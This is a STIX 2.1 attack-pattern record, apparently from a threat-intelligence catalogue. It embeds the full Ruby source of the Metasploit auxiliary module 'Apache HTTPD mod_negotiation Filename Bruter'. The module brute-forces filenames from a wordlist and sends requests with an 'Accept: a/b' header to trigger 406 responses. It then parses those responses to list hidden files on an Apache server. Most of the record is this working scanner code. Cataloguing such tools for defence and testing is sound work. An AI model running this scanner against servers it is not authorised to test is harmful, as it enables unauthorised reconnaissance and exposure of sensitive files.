{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c5fe2d28-1bac-483a-a69f-e6e34d1ad361",
    "created": "2024-08-14T16:28:47.721176Z",
    "modified": "2024-08-14T16:28:47.72118Z",
    "name": "Apache HTTPD mod_negotiation Filename Bruter",
    "description": " This module performs a brute force attack in order to discover existing files on a server which uses mod_negotiation. If the filename is found, the IP address and the files found will be displayed. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/mod_negotiation_brute.rb",
            "external_id": "mod_negotiation_brute.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# mod_negotiation bruter\n# http://httpd.apache.org/docs/1.3/content-negotiation.html\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'   \t\t=> 'Apache HTTPD mod_negotiation Filename Bruter',\n      'Description'\t=> %q{\n          This module performs a brute force attack in order to discover existing files on a\n        server which uses mod_negotiation. If the filename is found, the IP address and the\n        files found will be displayed.\n      },\n      'Author' \t\t=> [ 'diablohorn [at] gmail.com' ],\n      'License'\t\t=> MSF_LICENSE))\n\n    register_options(\n      [\n        OptString.new('PATH', [ true,  \"The path to detect mod_negotiation\", '/']),\n        OptPath.new('FILEPATH',[true, \"path to file with file names\",\n          File.join(Msf::Config.data_directory, \"wmap\", \"wmap_files.txt\")])\n      ])\n  end\n\n  def run_host(ip)\n    ecode = nil\n    emesg = nil\n\n    tpath = normalize_uri(datastore['PATH'])\n    tfile = datastore['FILEPATH']\n\n    if tpath[-1,1] != '/'\n      tpath += '/'\n    end\n\n    # load the file with filenames into memory\n    queue = []\n    File.open(datastore['FILEPATH'], 'rb').each_line do |fn|\n      queue << fn.strip\n    end\n\n    vhost = datastore['VHOST'] || ip\n    prot  = datastore['SSL'] ? 'https' : 'http'\n\n    #\n    # Send the request and parse the response headers for an alternates header\n    #\n    begin\n      queue.each do |dirname|\n      reqpath = tpath+dirname\n        # Send the request the accept header is key here\n        res = send_request_cgi({\n          'uri'  \t\t=>  reqpath,\n          'method'   \t=> 'GET',\n          'ctype'     => 'text/html',\n          'headers'\t=> {'Accept' => 'a/b'}\n        }, 20)\n\n        return if not res\n\n        # Check for alternates header and parse them\n        if(res.code == 406)\n          chunks = res.headers.to_s.scan(/\"(.*?)\"/i).flatten\n          chunks.each do |chunk|\n            chunk = chunk.to_s\n            print_status(\"#{ip} #{tpath}#{chunk}\")\n          end\n        end\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n\n  end\nend\n"
}